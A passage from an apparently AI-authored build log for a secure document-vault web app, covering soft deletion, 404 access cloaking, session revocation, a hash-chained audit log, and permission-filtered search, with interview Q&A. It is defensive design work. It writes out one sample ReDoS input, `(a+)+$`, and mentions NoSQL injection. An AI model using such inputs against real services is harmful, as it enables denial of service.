  - If a system returns HTTP 410 `Gone` or HTTP 403 `Forbidden` when an unauthorized user probes a deleted document, attackers can map the historical existence of confidential files. Returning HTTP 404 `Not Found` for *everyone* (including the document owner) ensures that deleted resources are indistinguishable from non-existent resources, preventing existence oracle attacks.
- **Database-Level Query Filtering (Rule 6):**
  - Enforcing `{ deletedAt: null }` inside MongoDB queries ensures that soft-deleted documents never enter application memory during listing or search operations. This preserves database pagination (`skip`/`limit`) integrity and prevents response-timing discrepancies that could reveal deleted document volume.

---

### 4. What Attacks This Design Prevents
1. **Audit Trail Invalidation & Forensic Evidence Destruction (CWE-778):**
   - Retaining soft-deleted records prevents attackers from destroying audit evidence by deleting compromised documents, ensuring that audit events maintain complete provenance.
2. **Resource Existence Enumeration via Status Code Oracles (CWE-200 / CWE-209):**
   - Returning HTTP 404 universally on all routes ensures that deleted documents cannot be probed or differentiated from non-existent documents.
3. **Ghost Access & Unauthorized Access to Deleted Assets (CWE-284):**
   - Placing the `doc.deletedAt` check inside `authorize()` guarantees that no user—even with pre-existing explicit permission grants—can download, inspect, or modify a deleted file.
4. **Data Leakage in Search & Listing (CWE-200):**
   - Database-level filtering strictly excludes soft-deleted items from keyword search results and collection listings.

---

### 5. Technical Interview Questions & Answers

#### Question 1: What are the security and regulatory advantages of soft-deletion using tombstones over hard deletion in enterprise vault architectures?
**Answer:**
1. **Referential Integrity for Non-Repudiable Audit Trails:**
   - Security audit logs (`AuditEvent`) record events such as uploads, permissions grants, downloads, and deletions, typically storing foreign key references (`documentId`). If an application performs hard deletions (`Document.deleteOne()`), all historical audit entries referencing that document become broken dangling pointers. Soft deletion retains the document entity (including immutable cryptographic hashes like SHA-256 and original metadata) so auditors can reconstruct complete provenance.
2. **Accidental Deletion & Forensic Recovery:**
   - Hard deletion is permanent and immediate. In insider-threat or ransomware scenarios where malicious actors attempt to wipe sensitive corporate records, soft deletion provides a tombstone marker that enables incident response teams to investigate what was targeted and restore data if necessary.
3. **Legal Hold Compliance:**
   - Legal and regulatory frameworks (e.g. SEC Rule 17a-4, Sarbanes-Oxley, HIPAA) mandate document retention for fixed statutory periods. When a user "deletes" a file, the organization cannot purge the record if it is subject to an active litigation hold; soft deletion allows the application to hide the document from users while fulfilling legal retention obligations.

#### Question 2: Why must soft-deleted resources return HTTP 404 rather than HTTP 410 Gone or HTTP 403 Forbidden in high-assurance security applications?
**Answer:**
1. **Elimination of Resource Existence Oracles (CWE-200):**
   - An HTTP 410 `Gone` status explicitly confirms to the requester: *"This resource once existed here, but has been deleted."* In a confidential document vault, confirming that a sensitive file (e.g., `merger_agreement_q3.pdf` at ID `65a...`) existed is itself an information leak that assists adversary reconnaissance.
   - An HTTP 403 `Forbidden` status informs the requester that the resource exists but they lack permission.
   - Returning HTTP 404 `Not Found` universally—for anonymous users, third-party viewers, administrators, and even the original owner—ensures that deleted documents are functionally and observationally identical to non-existent IDs.
2. **Timing Equalization:**
   - When coupled with constant-time error handling, returning 404 prevents side-channel timing analysis where attackers measure database query differences to determine whether an ID was ever registered.

#### Question 3: How do you prevent query performance degradation and index bloat when implementing soft deletion on high-volume MongoDB collections?
**Answer:**
1. **Partial Indexes (MongoDB Partial Filter Expressions):**
   - As a collection grows, soft-deleted documents accumulate and take up memory in B-Tree indexes. If 90% of documents in a collection are active and 10% are soft-deleted, standard compound indexes on `(ownerId, createdAt)` index all documents, wasting RAM.
   - Using MongoDB Partial Indexes with a filter expression:
     ```javascript
     documentSchema.index(
       { owner: 1, createdAt: -1 },
       { partialFilterExpression: { deletedAt: null } }
     );
     ```
     ensures that MongoDB only indexes active documents. Queries filtering by `{ deletedAt: null }` utilize the partial index, resulting in smaller index sizes, higher cache hit ratios, and faster write throughput.
2. **Sparse Indexes vs Null Filtering:**
   - When soft-deleted records have `deletedAt` set to a timestamp and active records omit the field or have `null`, indexing `deletedAt` with partial filtering avoids indexing soft-deleted records for active search queries while allowing background lifecycle cleanup jobs (e.g. TTL indexes on `deletedAt`) to efficiently identify expired tombstones.

---

## Build Entry: Admin User Lifecycle Management, 404 Access Cloaking, and Instant Multi-Session Invalidation
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Admin User Management Endpoints (`src/routes/admin.js`):**
  - `POST /admin/users` (and `/api/admin/users`): Allows administrator to create new user accounts with Argon2id password hashing, email validation, and role assignment (`user` vs `admin`).
  - `PATCH /admin/users/:id/role`: Allows administrator to promote or demote user roles.
  - `POST /admin/users/:id/disable` (and `PATCH /admin/users/:id/disable`): Sets `isActive: false` and instantly invalidates all active sessions for that user across all devices.
- **Strict 404 Authorization Cloaking:**
  - Implemented `requireAdmin` middleware: unauthenticated requests, non-admin accounts (`role: 'user'`), and deactivated accounts unconditionally receive HTTP 404 `Not Found` (never 403 or 401 per Rule 3), concealing administrative interfaces.
- **Instant Multi-Session Revocation:**
  - Implemented `endUserSessions()`: synchronously purges session entries from the Express session store and MongoDB `sessions` collection, closing any token revocation vulnerability window immediately upon account suspension.
- **Integration Test Suite (`tests/admin.test.js`):**
  - Authored 20 automated tests validating admin route security, non-admin 404 cloaking, password hashing, role updates, and multi-session revocation.
- **Architectural Documentation (`docs/DECISIONS.md`):**
  - Recorded ADR 025.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `tests/admin.test.js` | Created | Automated test suite (20 tests) testing admin routes, 404 cloaking, and immediate session invalidation. |
| `src/routes/admin.js` | Created | Admin router handling user creation, role updates, and user disabling with session destruction. |
| `src/app.js` | Modified | Mounted admin user routes at `/admin/users`, `/api/admin/users`, `/users`, and `/api/users`. |
| `docs/DECISIONS.md` | Modified | Recorded ADR 025. |
| `docs/BUILD_LOG.md` | Modified | Appended this build log entry. |

---

### 3. Why This Design
- **Universal 404 Cloaking Gate:** Returning 403 Forbidden to unauthorized callers confirms the existence of administrative surfaces, inviting targeted brute-force and vulnerability scanning. Returning 404 renders administrative surfaces indistinguishable from non-existent routes.
- **Active Session Invalidation vs Lazy Database Checks:** In high-concurrency systems, relying only on database queries to detect deactivated users can leave stale sessions alive in memory caches or token stores. Actively destroying the session records in the session store ensures instantaneous revocation across all client instances.

---

### 4. What Attacks This Design Prevents
1. **Administrative Surface Enumeration (CWE-200):** Non-admins receive 404, preventing attackers from mapping administrative capabilities.
2. **Zombie Session / Revocation Delay Exploitation (CWE-613):** Disabled accounts have all active sessions terminated immediately.
3. **Privilege Escalation via Mass Assignment (CWE-915):** Endpoints validate role changes strictly against allowed enums.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why should administrative endpoints return HTTP 404 instead of HTTP 403 when accessed by non-administrative users?
**Answer:**
Returning HTTP 403 Forbidden leaks information (CWE-200) by confirming that an administrative endpoint exists at that URI. Attackers perform automated endpoint scanning to find interfaces like `/admin/users` or `/api/admin`. An HTTP 403 response tells the attacker they found a high-value route and prompts them to look for authentication bypasses or privilege escalation flaws. Returning HTTP 404 Not Found makes the route completely invisible, frustrating reconnaissance and preventing resource existence enumeration.

#### Question 2: Why is modifying `isActive: false` in the database insufficient on its own to immediately revoke a user's access, and how do you achieve instantaneous session invalidation?
**Answer:**
In many web architectures, session verification is decoupled from database queries (e.g. sessions are cached in Redis or in-memory, or endpoints only check session middleware without querying the user table on every single static or cached request). If `user.isActive` is set to `false`, an active session cookie remains valid in the session store until its TTL expires unless explicitly invalidated. To achieve true instantaneous revocation, the deactivation service must coordinate both database flag mutation and active destruction of all session records tied to that `userId` in the session store.

#### Question 3: How does Argon2id protect against offline password cracking compared to older hashing algorithms like SHA-256 or bcrypt?
**Answer:**
Unsalted or simple salted SHA-256 algorithms can be computed at billions of attempts per second on modern GPUs. Bcrypt introduces a computational work factor but has a fixed memory requirement of only 4 KB, allowing high-density parallel cracking on GPU/FPGA clusters. Argon2id is a memory-hard algorithm requiring configurable RAM (e.g. 19MB–64MB) per hashing instance, which saturates GPU memory bandwidth and prevents massive parallel dictionary attacks while resisting side-channel cache-timing attacks.

---

## Build Entry: Document Permission Granting & Revocation, Complete Lifecycle TDD, and Zero-Cache Dynamic Database Evaluation
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Test-Driven Permission Lifecycle Suite (`tests/permissions.test.js` - 16 passing tests):**
  - **Grant $\rightarrow$ Read $\rightarrow$ Revoke $\rightarrow$ 404 Flow:**
    - Document owner grants `read` level to viewer.
    - Viewer reads document metadata (`GET /documents/:id`) successfully (HTTP 200).
    - Document owner revokes permission for viewer (`DELETE /documents/:id/permissions/:userId`).
    - Viewer's immediate next request returns HTTP 404 `Not Found` (never 403 per Rule 3 & 4).
  - **Privilege Boundary Enforcement:**
    - Rejection of edit attempts (`PATCH /documents/:id`, `PUT /documents/:id`) with HTTP 404 for viewers with `read` grants.
    - Verification that viewers with `edit` grants can update metadata (`PATCH /documents/:id` returns 200), but cannot delete documents (`DELETE /documents/:id` returns 404) and cannot grant permissions to other users (`POST /documents/:id/permissions` returns 404).
    - Verification that viewers with `edit` grants cannot revoke permissions (`DELETE /documents/:id/permissions/:userId` returns 404).
  - **Ownership Exclusivity:**
    - Verified that only the document owner can grant or revoke permissions. Non-owners (viewers, unrelated users, administrators without document ownership) receive HTTP 404.
    - Unauthenticated requests return HTTP 401.
  - **Input Validation & Idempotency:**
    - Rejection of invalid permission levels (e.g. `delete`, `admin`, `manage`) with HTTP 400.
    - Returning 404 when attempting to grant permissions to a non-existent target user ID.
    - Idempotent permission level updates (e.g., upgrading `read` to `edit` via upsert).
    - Full parity support for alternative route aliases (`POST /documents/:id/grant`, `POST /documents/:id/revoke`, and query-based `DELETE /documents/:id/permissions?userId=...`).
- **Encapsulated Permission Service Functions (`src/services/documentService.js`):**
  - Implemented `grantPermission(user, documentId, { userId, email, level }, context)`:
    - Enforces `authorize(user, doc, 'grant')`.
    - Validates target user existence and ensures `level` is in `['read', 'edit']`.
    - Upserts the `Permission` document (`findOneAndUpdate` with `upsert: true`).
    - Logs an immutable `PERMISSION_GRANT` audit event with status `SUCCESS`.
  - Implemented `revokePermission(user, documentId, targetUserId, context)`:
    - Enforces `authorize(user, doc, 'grant')`.
    - Removes the record from the `Permission` collection (`deleteOne`).
    - Logs an immutable `PERMISSION_REVOKE` audit event with status `SUCCESS`.
- **Zero-Cache Dynamic Database Evaluation:**
  - Evaluated on every incoming request in `src/authz.js` via `await Permission.findOne({ documentId: doc._id, userId: user._id })` directly against MongoDB with zero in-memory or session caching. Deleting or updating a permission record takes effect instantaneously.
- **RESTful Permission Routes (`src/routes/documents.js`):**
  - Mounted `POST /documents/:id/permissions` and alias `POST /documents/:id/grant`.
  - Mounted `DELETE /documents/:id/permissions/:userId`, alias `POST /documents/:id/revoke`, and query alias `DELETE /documents/:id/permissions`.
- **Architectural Documentation (`docs/DECISIONS.md`):**
  - Recorded ADR 026: Granular Document Permission Granting and Revocation, Owner Exclusivity, and Zero-Cache Direct Database Evaluation.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `tests/permissions.test.js` | Created | Test-first integration suite (16 tests) covering the grant/read/revoke/404 lifecycle, privilege boundaries, ownership exclusivity, and input validation. |
| `src/services/documentService.js` | Modified | Implemented `grantPermission()` and `revokePermission()` with ownership verification, input validation, and audit event logging. |
| `src/routes/documents.js` | Modified | Mounted permission grant and revoke endpoints with RESTful paths and aliases. |
| `docs/DECISIONS.md` | Modified | Appended ADR 026. |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Elimination of the Stale Revocation Window:**
  - In distributed web architectures, permissions are frequently cached in Redis or baked into stateless JWT claims. While caching reduces database read traffic, it introduces a dangerous "revocation delay" window: after an owner revokes a user's access, the revoked user can continue reading or exfiltrating confidential documents until the cache TTL expires.
  - By performing a dynamic query (`Permission.findOne`) against MongoDB on every request, permission state is guaranteed to be completely fresh. Revocation takes effect with zero latency.
- **Indexed Read Performance:**
  - The `Permission` collection utilizes a unique compound index `{ documentId: 1, userId: 1 }`. MongoDB evaluates this query in $<1\text{ms}$ via indexed B-Tree index lookups, avoiding collection scans and providing sub-millisecond authorization without caching.
- **Ownership Exclusivity & Privilege Ceilings:**
  - Rule 4 strictly dictates that only the owner can grant or revoke permissions. Even system administrators cannot grant themselves or others access to files they do not own.
  - Restricting permission levels to `['read', 'edit']` ensures that viewers can never be delegated administrative capabilities (`delete` or `grant`), preventing lateral and vertical privilege escalation.
- **Universal 404 Error Cloaking:**
  - When an unauthorized viewer attempts to edit a read-only document, or when a non-owner attempts to grant permissions, the system returns HTTP 404 `Not Found` (never 403). Unauthorized callers cannot determine whether a document exists or what access control lists are configured on it.

---

### 4. What Attacks This Design Prevents
1. **Stale Permission Window Exploitation (CWE-613 / CWE-384):**
   - Zero-cache database evaluation ensures that a revoked user cannot access a document a fraction of a second after revocation.
2. **Privilege Escalation via Unauthorized Permission Delegation (CWE-269 / CWE-284):**
   - Viewers with `edit` permissions cannot grant permissions to third-party accounts, preventing compromised viewer accounts from spreading access.
3. **Unauthorized Modification by Read-Only Viewers (CWE-285):**
   - Viewers granted `read` level are rejected with 404 when attempting metadata mutations (`PATCH /documents/:id`, `PUT /documents/:id`).
4. **Unauthorized Deletion by Edit Viewers (CWE-284):**
   - Viewers granted `edit` level are rejected with 404 when attempting document deletion (`DELETE /documents/:id`).
5. **Access Control & Document Existence Enumeration (CWE-200 / CWE-209):**
   - Returning HTTP 404 for all denied authorization attempts ensures attackers cannot discover confidential document IDs or probe ACLs.

---

### 5. Technical Interview Questions & Answers

#### Question 1: Why is caching access control permissions in memory or session tokens dangerous in multi-tenant document systems, and how does direct database evaluation prevent stale permission windows?
**Answer:**
1. **The Stale Revocation Window:**
   - When permissions are cached (e.g. in Redis with a 15-minute TTL, in application memory, or inside signed JWT access tokens), the authorization decision is decoupled from the current source of truth.
   - If an employee is terminated or a sensitive document is unshared, the owner executes a revocation in the database. However, the revoked user continues making requests using their active session or cached token. Until the cache expires, the application continues granting access, creating a window for data exfiltration.
2. **Direct Database Evaluation with Compound Indexing:**
   - Direct database evaluation (`Permission.findOne({ documentId, userId })`) queries the authoritative database on every request. When `Permission.deleteOne()` commits, the permission record ceases to exist immediately. The very next HTTP request evaluates against the database, finds `null`, and returns HTTP 404.
   - Leveraging MongoDB's unique compound index `{ documentId: 1, userId: 1 }` guarantees that the lookup executes in $O(\log N)$ B-Tree lookup time with minimal I/O overhead, delivering real-time consistency without cache invalidation complexity.

#### Question 2: How do you design an Access Control List (ACL) data model to prevent BSON document size bloat and write lock contention in high-concurrency document management systems?
**Answer:**
1. **The Pitfall of Embedded Permissions Arrays:**
   - Embedding permissions directly inside the document (`document.permissions = [{ userId, level }, ...]`) creates several severe architectural bottlenecks:
     - **BSON Size Limits:** In enterprise environments where documents are shared with hundreds or thousands of users or groups, the document risks exceeding MongoDB's 16MB document size limit.
     - **Write Contention:** Whenever any permission is granted, modified, or revoked, the entire `Document` record must be locked for writing. Concurrent metadata updates and permission changes cause document write conflicts.
     - **Search Filtering Inefficiency:** Filtering search queries across embedded permission arrays (`$elemMatch`) is slower and harder to index than normalized collection joins or indexed lookups.
2. **The Normalized Collection Pattern:**
   - Separating permissions into an independent `Permission` collection with fields `{ documentId, userId, level, createdAt }`:
     - Guarantees each permission is an isolated document, eliminating document size limits.
     - Confines permission grant/revoke writes to the `Permission` collection without locking the parent `Document`.
     - Supports unique compound indexing `{ documentId: 1, userId: 1 }`, guaranteeing idempotency and preventing duplicate grants.

#### Question 3: Why should a system return HTTP 404 rather than HTTP 403 when a user with a `read` grant attempts to edit, delete, or grant permissions on a document?
**Answer:**
1. **Prevention of Capability and Resource Existence Oracles (CWE-200):**
   - In standard HTTP semantics, HTTP 403 Forbidden indicates: *"The server understood the request, but refuses to authorize it."* This implicitly tells the attacker two critical facts:
     - The document exists at that ID.
     - The requester's credentials were authenticated, but their current role/grant lacks the required privilege level.
   - An attacker can exploit 403 responses to map out the system: differentiating between IDs that do not exist (404) and confidential documents they are forbidden to access (403).
2. **Uniform 404 Cloaking:**
   - By returning HTTP 404 Not Found on *all* authorization denials, the system makes unauthorized documents observationally indistinguishable from non-existent resources.
   - A user with a `read` grant attempting `PATCH /documents/:id` receives 404. They cannot probe whether the endpoint supports editing or whether the document allows writes; from their perspective, the editable resource simply does not exist.

---

## Build Entry: Cryptographically Chained Audit Subsystem, verifyChain(), Concurrency Fork Resistance, and Database-Level App User Least Privilege
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Comprehensive Audit Test Suite (`tests/audit.test.js` - 24 passing tests, written first):**
  - **Cryptographic Hash Chaining:** Verified genesis block sequence 1 and 64-zero `previousHash`, and subsequent sequential block linkage where each event's `previousHash` equals prior block's `hash`.
  - **Tamper Detection (`verifyChain()`):** Verified that altering an audit row directly at the database level makes `verifyChain()` fail with `valid: false` identifying the tampered sequence; verified detection of modified `previousHash`, modified `hash`, and sequence gaps from deleted rows.
  - **Concurrency & Fork Prevention:** Executed 10 parallel `logAuditEvent` calls simultaneously via `Promise.all`. Confirmed that unique index enforcement on `sequenceNumber` with jittered backoff retries assigns strictly contiguous sequence numbers (1..10) with zero forks.
  - **MongoDB App User Least Privilege:** Verified that `audit_app_user` can insert and find audit events, but update and delete commands fail with database-level `not authorized` errors.
  - **Complete Event Logging Coverage:** Verified logging for upload, download, metadata edit, file replacement (recording both `oldSha256` and `newSha256`), delete, grant, revoke, user create, role change, user disable, and every denied attempt (unauthorized access, bad uploads, non-admin attempts).
  - **End-to-End Chain Verification:** Verified that an entire lifecycle workflow of real application operations forms a valid, unbroken cryptographic chain.
- **Cryptographic Hash Chaining Engine (`src/audit.js`):**
  - Implemented deterministic key-sorted serialization `canonicalizeContent()`.
  - Implemented `calculateHash(previousHash, contentStr)` computing SHA-256 over `previousHash:canonicalContent`.
  - Implemented `logAuditEvent(params)` with automatic concurrency retry on MongoDB duplicate key error `E11000`.
  - Implemented `verifyChain()` validating sequence continuity, hash pointer fidelity, and content integrity.
  - Implemented `setupAuditAppUser(mongooseConnection)` configuring `auditInsertFindOnly` role (`insert` and `find` actions only on `auditevents`) and `audit_app_user`.
- **Database Model Enhancements (`src/models/AuditEvent.js`):**
  - Added `sequenceNumber`, `previousHash`, and `hash` fields.
  - Enforced `{ sequenceNumber: 1 }` unique index.
  - Added instance-level fallback generation in pre-save for backward compatibility with direct Mongoose creation.
- **Application Event Logging Integration:**
  - Implemented `replaceDocumentFile()` in `src/services/documentService.js` and mounted `POST /documents/:id/replace` in `src/routes/documents.js`, recording `oldSha256` and `newSha256`.
  - Integrated `USER_CREATE`, `ROLE_CHANGE`, `USER_DISABLE`, and `ACCESS_DENIED` audit logging in `src/routes/admin.js`.
  - Added provisioning in `scripts/setup-audit-user.js` and `scripts/seed.js`.
- **Architectural Documentation (`docs/DECISIONS.md`):**
  - Recorded ADR 027.

---

### 2. Which Files Were Created / Modified
| File | Status | Purpose |
|---|---|---|
| `tests/audit.test.js` | Created | Comprehensive test-first integration suite (24 tests) validating hash chaining, verifyChain, tamper detection, concurrency, app user least privilege, and event logging. |
| `src/audit.js` | Re-implemented | Core audit engine featuring cryptographic chaining, SHA-256 digest computation, concurrency retry, verifyChain(), and setupAuditAppUser(). |
| `src/models/AuditEvent.js` | Modified | Added `sequenceNumber`, `previousHash`, and `hash` fields with unique index and fallback pre-save hook. |
| `src/services/documentService.js` | Modified | Implemented `replaceDocumentFile()` calculating and recording old and new SHA-256 digests in `FILE_REPLACE` audit event. |
| `src/routes/documents.js` | Modified | Mounted file replacement endpoints (`POST /documents/:id/replace`, aliases `PUT /replace`, `POST /file`, `PUT /file`). |
| `src/routes/admin.js` | Modified | Integrated audit logging for user creation (`USER_CREATE`), role changes (`ROLE_CHANGE`), disabling (`USER_DISABLE`), and denied attempts (`ACCESS_DENIED`). |
| `scripts/setup-audit-user.js` | Created | Standalone provisioning script to create the MongoDB app user with least privilege. |
| `scripts/seed.js` | Modified | Integrated audit app user provisioning into the database seed lifecycle. |
| `docs/DECISIONS.md` | Modified | Appended ADR 027. |
| `docs/BUILD_LOG.md` | Modified | Appended this technical build log entry. |

---

### 3. Why This Design
- **Cryptographic Immutability & Tamper Evidence:**
  - Conventional database audit tables can be surreptitiously modified by attackers with compromised database credentials. By linking every event to the prior event's hash (`hash = SHA256(previousHash + ":" + canonicalContent)`), modifying any historical event alters its hash, which immediately invalidates the next event's `previousHash` pointer and breaks all subsequent links. `verifyChain()` detects any alteration with mathematical certainty.
- **Unique Index Fork Prevention with Automatic Retry:**
  - In distributed systems, concurrent workers logging events at the same microsecond can create divergent chains ("forks") if both workers link to the same previous record. By placing a unique index `{ sequenceNumber: 1 }` on MongoDB, the database engine guarantees that exactly one insert succeeds. The competing worker receives an `E11000` duplicate key error, triggers a jittered backoff, fetches the newly committed head of the chain, and links sequentially without branching.
- **Database-Level Least Privilege (`auditInsertFindOnly`):**
  - Application-level immutability hooks (`pre('save')`, `pre('updateOne')`) protect against accidental application modifications, but cannot defend against compromised MongoDB connections or raw database commands. Creating a dedicated MongoDB user restricted strictly to `insert` and `find` actions enforces immutability directly in the database engine, blocking `update` and `delete` commands even if application code is breached.

---

### 4. What Attacks This Design Prevents
1. **Audit Log Tampering & Repudiation (CWE-778 / CWE-353):**
   - Attackers altering audit records to conceal unauthorized activity are immediately detected by `verifyChain()`.
2. **Audit Trail Forking & Desynchronization (CWE-362):**
   - Unique sequence number indexing prevents race conditions from splitting the audit trail into parallel branches.
3. **Database-Level Log Destruction (CWE-250):**
   - Compromised application keys cannot delete or overwrite audit logs because the database engine rejects `update` and `delete` commands.
4. **Silent Document Replacement & Integrity Loss (CWE-353):**
   - File replacements record both `oldSha256` and `newSha256`, preserving cryptographic provenance of file modifications.
5. **Reconnaissance via Admin Interface Enumeration (CWE-200):**
   - Unauthorized attempts to access administrative endpoints log `ACCESS_DENIED` and return HTTP 404, preventing resource mapping.

---

### 5. Technical Interview Questions & Answers

#### Question 1: How does cryptographic hash chaining provide non-repudiation and tamper-evidence in audit logging systems, and how does `verifyChain()` detect alterations?
**Answer:**
1. **The Hash Chaining Primitive:**
   - In a hash-chained audit log, every record stores three cryptographic components: a monotonically increasing `sequenceNumber`, a `previousHash` pointer, and its own cryptographic `hash`.
   - The hash is computed as:
     $$\text{hash}_i = \text{SHA256}(\text{hash}_{i-1} \parallel \text{canonicalContent}_i)$$
     where $\parallel$ denotes concatenation and $\text{canonicalContent}_i$ is a deterministic serialization of the event payload.
2. **Tamper Detection Mechanism in `verifyChain()`:**
   - If an adversary alters any field in record $k$ (e.g., changing status from `'DENIED'` to `'SUCCESS'`), $\text{canonicalContent}_k$ changes.
   - When `verifyChain()` recomputes $\text{SHA256}(\text{hash}_{k-1} \parallel \text{canonicalContent}_k)$, the calculated digest will not match the stored $\text{hash}_k$.
   - If the adversary also recalculates and updates $\text{hash}_k$, then in record $k+1$, $\text{previousHash}_{k+1}$ will point to the old hash, failing the pointer check.
   - To successfully forge a tampered record, the attacker would have to recompute the hashes of all records from $k$ to $N$. If the latest hash is periodically anchored (e.g., to an external ledger, syslog, or S3 bucket with Object Lock), any historical forgery is detected immediately.

#### Question 2: Why are unique indexes and optimistic retry loops superior to application-level mutexes for preventing audit chain forks under high concurrency?
**Answer:**
1. **The Limitation of Application-Level Mutexes:**
   - In modern cloud environments, web applications run across multiple Node.js cluster processes, Docker containers, or serverless instances. An in-memory mutex (e.g. `async-mutex`) only synchronizes threads within a single process; it cannot prevent concurrent writes across separate server instances.
   - Using distributed locks (e.g. Redlock in Redis) introduces external operational dependencies, lock timeout race conditions, and single points of failure.
2. **Database Engine Unique Constraints as Atomic Arbiters:**
   - MongoDB's B-Tree unique index `{ sequenceNumber: 1 }` acts as the single source of truth across all application instances. When two servers attempt to commit sequence $N+1$ concurrently, MongoDB's storage engine enforces atomic write serialization. Exactly one insert commits; all other inserts fail with duplicate key error `E11000`.
3. **Optimistic Retry with Jitter:**
   - Instead of blocking on pessimistic locks, workers operate optimistically: compute the expected sequence and hash, and attempt insertion. On collision, workers back off with randomized jitter, re-read the newly committed head, and retry. This provides non-blocking high throughput with mathematically guaranteed single-chain linearity.

#### Question 3: Why is database-level Role-Based Access Control (RBAC) necessary in addition to application-level ORM/ODM immutability hooks?
**Answer:**
1. **The Failure Modes of Application-Level Hooks:**
   - Mongoose pre-hooks (`schema.pre('updateOne')`, `schema.pre('save')`) only execute when operations originate through specific Mongoose model methods.
   - They can be bypassed by:
     - Direct MongoDB collection driver calls (`db.collection('auditevents').updateOne()`).
     - Raw MongoDB pipeline updates or database management tools (Compass, mongosh).
     - NoSQL injection vulnerabilities where attackers inject update operators (`$set`).
     - Compromised server environments where an attacker loads a script that imports MongoDB without Mongoose schemas.
2. **Database Engine Privilege Separation:**
   - Configuring the MongoDB user (`audit_app_user`) with privileges restricted strictly to `insert` and `find` actions enforces security at the kernel/storage engine level.
   - Even if an attacker executes arbitrary JavaScript inside the Node.js process or exploits a remote code execution (RCE) flaw, any attempt to run `update`, `delete`, `dropDatabase`, or `dropIndex` commands is intercepted and terminated by the MongoDB engine with an authorization failure (`CommandNotAuthorized`).

---

## Build Entry: Document Search Engine with In-Database Permission Filtering & Anti-Leakage Specification
**Date:** 2026-10-24  
**Author:** Antigravity  

---

### 1. What Was Built
- **Strict Leakage Test Suite (TDD First):**
  - Seeded 40 documents matching a common search term (`quarterly-audit-report-leakage-target`) owned by `owner@trustvault.local`.
  - Granted `read` permissions to `viewer@trustvault.local` on exactly 3 of those 40 documents.
  - Verified that when the viewer searches for the term, both the returned document array and the result count (`res.body.count`, `res.body.total`) equal exactly 3.
  - Verified that none of the 37 ungranted documents are returned or leaked in count metadata, while the owner searching the same term receives all 40 documents.
- **Multi-Criteria Search Engine:**
  - Implemented multi-criteria search filtering across:
    - `name` / `title`: matches document name, title, or original file name.
    - `owner`: matches by owner email (e.g., `owner@trustvault.local`) or by user ObjectId.
    - `category`: matches document category (e.g., `human-resources`, `finance`, `legal`).
    - `date range`: filters `createdAt` timestamps with support for `startDate` / `endDate`, `from` / `to`, and `createdAfter` / `createdBefore`.
    - `general query`: substring text search across name, title, description, category, tags, and original file name.
- **Rule 6 Database-Level Query Enforcement:**
  - Active permissions are queried from MongoDB (`Permission.find({ userId: user._id }).select('documentId').lean()`).
  - Permission boundaries (`{ deletedAt: null }`, `{ $or: [{ owner: user._id }, { ownerId: user._id }, { _id: { $in: grantedDocIds } }] }`) and search criteria are unified into a single `$and` query object passed directly to `Document.find()`.
  - No documents outside the user's explicit permission scope are ever fetched into Node.js application memory.
- **Anti-Leakage Response Metadata:**
  - Both `/documents` and `/documents/search` return `count`, `total`, `resultCount`, `documents`, and `results` strictly reflecting the permission-filtered database result set size.

---

### 2. Which Files Were Created or Modified
| File | Action | Purpose |
|---|---|---|
| `tests/search.test.js` | Created | Automated test suite verifying leakage prevention (40 docs, 3 grants -> exactly 3 count), multi-criteria filtering (name, owner, category, date range), soft-delete exclusion, and DB-level query construction spy. |
| `src/services/documentService.js` | Modified | Extended `listDocuments` and `searchDocuments` to compile multi-criteria search filters (`name`, `owner`, `category`, `date range`, `query`) and permission boundaries into MongoDB `$and` queries. |
| `src/routes/documents.js` | Modified | Forwarded `req.query` directly into `searchDocuments` and populated anti-leakage `count`, `total`, `resultCount`, `documents`, and `results` in HTTP responses. |
| `docs/DECISIONS.md` | Modified | Documented ADR 028: Multi-Criteria Document Search with In-Database Permission Filtering and Anti-Leakage Result Count Guarantees. |
| `docs/BUILD_LOG.md` | Modified | Recorded this technical build entry. |

---

### 3. Why This Design
- **Fulfillment of Rule 6 (No Post-Fetch Filtering):**
  - Many applications query the database with search parameters alone (`Document.find({ name: /term/ })`) and filter out unauthorized records in JavaScript memory (`results.filter(doc => authorize(user, doc))`).
  - This design is fundamentally flawed: it transfers confidential documents across the database network socket, saturates Node.js heap memory, exposes unshared data to memory scraping, and creates timing side-channels.
  - By injecting `{ $or: [{ owner: user._id }, { ownerId: user._id }, { _id: { $in: grantedDocIds } }] }` directly into the MongoDB query, the database storage engine evaluates index bounds and discards unowned, unshared documents at the storage layer.
- **Strict Anti-Leakage Count Guarantees:**
  - If a search endpoint executes `Document.countDocuments({ name: /term/ })` alongside paginated results, an attacker can enumerate the exact count of confidential documents across the organization (e.g. discovering that "M&A Acquisition Target XYZ" appears in 40 confidential documents).
  - Tying `count` strictly to `documents.length` from the permission-filtered query guarantees that zero metadata leaks to unauthorized users.
- **Regex Sanitization & ReDoS Prevention:**
  - User search inputs are sanitized with `replace(/[.*+?^${}()|[\]\\]/g, '\\$&')` before constructing `RegExp` objects, preventing Regular Expression Denial of Service (ReDoS) and regex operator injection.

---

### 4. What Attacks This Design Prevents
1. **Metadata & Existence Leakage via Search Counter Enumeration (CWE-200):**
   - An adversary querying sensitive keywords (e.g., project codenames, executive salaries) cannot infer document volume or existence from response counters because `count` reflects only documents they are authorized to access.
2. **Broken Object Level Authorization in Search (CWE-285 / OWASP API1:2023):**
   - In-database permission filtering guarantees that unauthorized documents are never returned, even under complex boolean or multi-parameter searches.
3. **Regular Expression Denial of Service (ReDoS) (CWE-1333):**
   - Escaping special regex characters in search parameters prevents malicious inputs (e.g. `(a+)+$`) from locking up the Node.js event loop or MongoDB query thread.
4. **Resurrected Soft-Deleted Data Leakage (CWE-668):**
   - The query condition `{ deletedAt: null }` is mandatory and hardcoded in every search query, preventing soft-deleted documents from reappearing in search results.
5. **Memory Exhaustion & Timing Oracles (CWE-400 / CWE-208):**
   - Eliminating in-memory post-filtering prevents large query matches from exhausting Node.js memory buffers and removes measurable execution time discrepancies that leak search match density.

---

### 5. Technical Interview Questions & Answers

